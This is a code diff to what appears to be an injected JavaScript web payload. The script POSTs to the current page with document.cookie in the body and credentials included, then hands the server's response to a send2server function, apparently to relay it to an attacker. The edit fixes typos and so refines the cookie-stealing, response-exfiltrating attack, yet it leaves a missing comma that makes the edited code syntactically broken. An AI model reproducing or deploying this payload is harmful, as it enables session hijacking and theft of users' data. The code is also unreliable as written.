@@ -6,12 +6,13 @@ window.addEventListener('load', function () {
     document.getElementById("chat-div").appendChild(img);
 }
 
-fetch(windows.location.pathname, {
-    'method': 'POST',
-    'body': 'name=test>&user_id=2&' +document.cookie,
+fetch(window.location.pathname, {
+     method: 'POST',
      headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
     }
+      credentials: 'include',
+     body: 'name=test&user_id=2&' +document.cookie
 }).then(function(response){
 	response.text().then(function(back){
 	 send2server("resp", back);	
